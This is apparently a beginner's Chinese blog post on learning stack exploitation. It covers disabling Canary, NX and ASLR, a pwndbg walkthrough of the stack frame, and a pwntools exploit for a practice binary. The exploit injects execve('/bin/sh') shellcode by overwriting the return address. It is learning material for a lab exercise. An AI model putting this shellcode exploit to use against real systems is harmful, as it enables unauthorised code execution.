---
layout:     post   			        # 使用的布局（不需要改）
title:      从0开始学pwn   			# 标题 
subtitle:   (1)  			#副标题
date:       2019-08-16 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

今天从零开始学**stack**,也算是记录一下吧,在这里记录一下特别细的知识点

## 准备环境

使用`gcc -g -fno-stack-protector -z execstack -o test test.c`依次关掉**Canary**和**NX**

`echo 0 > /proc/sys/kernel/randomize_va_space`关闭**ASLR**

` ulimit -c unlimited`表示自己程序只要错误就生成dump文件,之后`echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern`表示存到tmp目录下,之后我们就可以`gdb $文件名 core.%t`调试了

## ASLR和PIE的各种事

其实我第一遍学的时候以为,emm,这不是一样的东西吗,甚至以为效果是它俩求并就行,靠发现完全不是,[这个](https://blog.csdn.net/Plus_RE/article/details/79199772)写的很棒了,谢谢师傅,在这里简单记录一下技巧吧(表格中提到的是被随机化的,堆另外再提)

\ |aslr=0 | aslr=1 | aslr=2
:-: | :-: | :-: | :-:
开启PIE | null | code\data\stack | libc\code\data\stack
关闭PIE | null | stack | libc\stack

**brk()** 在aslr为1时地址静止,**mmap()** 地址随机

如果你想,emm,那我直接关闭本地aslr不完事了吗,hah,年轻了亚还是,远程服务器可是开着的,掩耳盗铃还行,所以一般情况下我们只能找漏洞点让数据泄漏出来

## 所有保护全关->跳转执行shellcode
在栈上写shellcode后ret直接指向shellcode就行,最简单的一种利用,但是我们要注意到底要覆盖多少字节,同时我们应该注意这种类型的漏洞关键便是理解好堆栈,我们以下方程序举例,一起分析一下堆栈
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void hello(int x) {
    printf("hello %d\n",x);
}

int main(int argc, char** argv) {
    hello(3);
}
```
然后直接`gcc -m32 test`进行编译运行,之后直接到gdb中进行调试
首先`b main`断到main函数,之后一步一步看
```
   0x8048435 <main+14>    sub    esp, 4
   0x8048438 <main+17>    sub    esp, 0xc
 ► 0x804843b <main+20>    push   3
   0x804843d <main+22>    call   hello <0x804840b>
```
这是hello函数前的准备,我们只需要注意`push 3`这步操作,执行完后esp-4,同时指向3
```
───────────────────────────────────[ DISASM ]───────────────────────────────────
   0x8048435 <main+14>    sub    esp, 4
   0x8048438 <main+17>    sub    esp, 0xc
   0x804843b <main+20>    push   3
 ► 0x804843d <main+22>    call   hello <0x804840b>
        arg[0]: 0x3
        arg[1]: 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f ('/hom')
        arg[2]: 0xffffd0bc —▸ 0xffffd2af ◂— 'XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0'
        arg[3]: 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
 
   0x8048442 <main+27>    add    esp, 0x10
   0x8048445 <main+30>    mov    eax, 0
   0x804844a <main+35>    mov    ecx, dword ptr [ebp - 4]
   0x804844d <main+38>    leave  
   0x804844e <main+39>    lea    esp, [ecx - 4]
   0x8048451 <main+42>    ret    
 
   0x8048452              nop    
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffcff0 ◂— 0x3
01:0004│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f ('/hom')
02:0008│      0xffffcff8 —▸ 0xffffd0bc —▸ 0xffffd2af ◂— 'XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0'
03:000c│      0xffffcffc —▸ 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
04:0010│      0xffffd000 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0
05:0014│      0xffffd004 —▸ 0xffffd020 ◂— 0x1
06:0018│ ebp  0xffffd008 ◂— 0x0
07:001c│      0xffffd00c —▸ 0xf7e16637 (__libc_start_main+247) ◂— add    esp, 0x10
```
之后call指令,我们把下一个地址即`0x8048442`入栈,我们`s`跟进,函数开始了经典的提升栈操作
```
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x804840b <hello>       push   ebp
   0x804840c <hello+1>     mov    ebp, esp
   0x804840e <hello+3>     sub    esp, 8
   0x8048411 <hello+6>     sub    esp, 8
   0x8048414 <hello+9>     push   dword ptr [ebp + 8]
   0x8048417 <hello+12>    push   0x80484e0
   0x804841c <hello+17>    call   printf@plt <0x80482e0>
 
   0x8048421 <hello+22>    add    esp, 0x10
   0x8048424 <hello+25>    nop    
   0x8048425 <hello+26>    leave  
   0x8048426 <hello+27>    ret    
```
看到执行到`hello+6`的操作应该是栈被抬高了
```
pwndbg> stack 8
00:0000│ esp  0xffffcfd8 ◂— 0x0
01:0004│      0xffffcfdc —▸ 0xf7e1632a (init_cacheinfo+666) ◂— mov    dword ptr [esp + 0xc], 2
02:0008│      0xffffcfe0 ◂— 0x1
... ↓
04:0010│ ebp  0xffffcfe8 —▸ 0xffffd008 ◂— 0x0
05:0014│      0xffffcfec —▸ 0x8048442 (main+27) ◂— add    esp, 0x10
06:0018│      0xffffcff0 ◂— 0x3
07:001c│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f ('/hom')
```
之后的` ► 0x8048414 <hello+9>     push   dword ptr [ebp + 8]`我们应该知道了,这个是参数,目前具体的堆栈图如下

指针 | 内存
:-: | :-: 
esp | sth 
esp+4 | sth
esp+8 | sth
esp+c | sth
ebp | $ebp
ebp+4 | ret
ebp+8 | 3

之后的调用我们就不谈了,继续到`leave`指令,所谓这个指令就是和抬升栈相反,我们只需要记住这是反操作就行了,执行完后指针下移,ret返回主函数
```
───────────────────────────────────[ DISASM ]───────────────────────────────────
   0x8048417 <hello+12>    push   0x80484e0
   0x804841c <hello+17>    call   printf@plt <0x80482e0>
 
   0x8048421 <hello+22>    add    esp, 0x10
   0x8048424 <hello+25>    nop    
   0x8048425 <hello+26>    leave  
 ► 0x8048426 <hello+27>    ret             <0x8048442; main+27>
    ↓
   0x8048442 <main+27>     add    esp, 0x10
   0x8048445 <main+30>     mov    eax, 0
   0x804844a <main+35>     mov    ecx, dword ptr [ebp - 4]
   0x804844d <main+38>     leave  
   0x804844e <main+39>     lea    esp, [ecx - 4]
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffcfec —▸ 0x8048442 (main+27) ◂— add    esp, 0x10
01:0004│      0xffffcff0 ◂— 0x3
02:0008│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f ('/hom')
03:000c│      0xffffcff8 —▸ 0xffffd0bc —▸ 0xffffd2af ◂— 'XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0'
04:0010│      0xffffcffc —▸ 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
05:0014│      0xffffd000 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0
06:0018│      0xffffd004 —▸ 0xffffd020 ◂— 0x1
07:001c│ ebp  0xffffd008 ◂— 0x0
```
顺利结束

## practice
我们简单使用**一步一步学ROP之linux_x86篇**的level1简单练习一下exp只需要改一下ret就行,我们找一下使用cyclic生成字符串后贴到里边,找到$esp-144,得到
```
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 EAX  0xc9
 EBX  0x0
 ECX  0xffffcfb0 ◂— 0x61616161 ('aaaa')
 EDX  0x100
 EDI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0x6261616a ('jaab')
 ESP  0xffffd040 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
 EIP  0x6261616b ('kaab')
───────────────────────────────────[ DISASM ]───────────────────────────────────
Invalid address 0x6261616b










───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffd040 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
01:0004│      0xffffd044 ◂— 'maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
02:0008│      0xffffd048 ◂— 'naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
03:000c│      0xffffd04c ◂— 'oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
04:0010│      0xffffd050 ◂— 'paabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
05:0014│      0xffffd054 ◂— 'qaabraabsaabtaabuaabvaabwaabxaabyaab\n'
06:0018│      0xffffd058 ◂— 'raabsaabtaabuaabvaabwaabxaabyaab\n'
07:001c│      0xffffd05c ◂— 'saabtaabuaabvaabwaabxaabyaab\n'
```
可见是`0xffffd040-144`,所以直接填到里边,exp如下
```

from pwn import *

p = process('./level1')

ret = 0xffffd040-144

# execve ("/bin/sh") 
# xor ecx, ecx
# mul ecx
# push ecx
# push 0x68732f2f   ;; hs//
# push 0x6e69622f   ;; nib/
# mov ebx, esp
# mov al, 11
# int 0x80

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

payload =  shellcode + 'A' * (140 - len(shellcode))   + p32(ret)

p.send(payload)

p.interactive()
```
但是在实际运行时发生错误,发现竟然相差0x10个字节,ret是`0xffffd050-144`,我并不知道为什么
```
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffffd050 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0
01:0004│      0xffffd054 —▸ 0x80481fc ◂— add    byte ptr cs:[eax], al /* '.' */
02:0008│      0xffffd058 —▸ 0x8048469 (__libc_csu_init+9) ◂— add    ebx, 0x1b8b
03:000c│      0xffffd05c ◂— 0x0
04:0010│      0xffffd060 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
... ↓
06:0018│      0xffffd068 ◂— 0x0
07:001c│      0xffffd06c —▸ 0xf7e16637 (__libc_start_main+247) ◂— add    esp, 0x10
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffcfb0
────────────────────────────────────────────────────────────────────────────────
pwndbg> x/32gx $esp-144
0xffffcfc0:	0x2f2f6851e1f7c931	0x896e69622f686873
0xffffcfd0:	0x41414180cd0bb0e3	0x4141414141414141
0xffffcfe0:	0x4141414141414141	0x4141414141414141
0xffffcff0:	0x4141414141414141	0x4141414141414141
0xffffd000:	0x4141414141414141	0x4141414141414141
0xffffd010:	0x4141414141414141	0x4141414141414141
0xffffd020:	0x4141414141414141	0x4141414141414141
0xffffd030:	0x4141414141414141	0x4141414141414141
0xffffd040:	0x4141414141414141	0xffffcfb041414141
0xffffd050:	0x080481fcf7fb03dc	0x0000000008048469
0xffffd060:	0xf7fb0000f7fb0000	0xf7e1663700000000
0xffffd070:	0xffffd10400000001	0x00000000ffffd10c
0xffffd080:	0x0000000000000000	0xf7ffdc04f7fb0000
0xffffd090:	0x00000000f7ffd000	0xf7fb0000f7fb0000
0xffffd0a0:	0x762412ab00000000	0x000000004b4f1cbb
0xffffd0b0:	0x0000000000000000	0x0804835000000001
pwndbg> p $esp
$1 = (void *) 0xffffd050
```
今天努力分析一下原因吧,虽然也能调出来,但是这佛系bug让我属实难以接受,不知道和本机环境有没有关系

## 简单的解释
简单看一下这个bug,我自己写了一个小demo
```
#include<stdio.h>
int main()
{
	int y=1;
	printf("%p\n",&y);
}
```
我们打印出来就是
```
➜  demo ./a.out     
0x7fffffffde54
```
可是使用pwntools直接process启这个进程发现确实会出现向后偏移0x10字节
```
from pwn import *
context.log_level = "debug"
p = process('./a.out')
p.interactive()
```
```
➜  demo python te.py 
[+] Starting local process './a.out': pid 13184
[*] Switching to interactive mode
[*] Process './a.out' stopped with exit code 0 (pid 13184)
[DEBUG] Received 0xf bytes:
    '0x7fffffffde64\n'
0x7fffffffde64
[*] Got EOF while reading in interactive
$ 
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[*] Got EOF while sending in interactive
```
发现这是一个普遍问题,所以以后找ret地址必须要gdb进行调试后再填写,不然会出现问题,当然解决办法也可以是多填写一些`nop`,只要位置够,当然象这种直接在栈上写shellcode的题也确实不多,毕竟这么简单
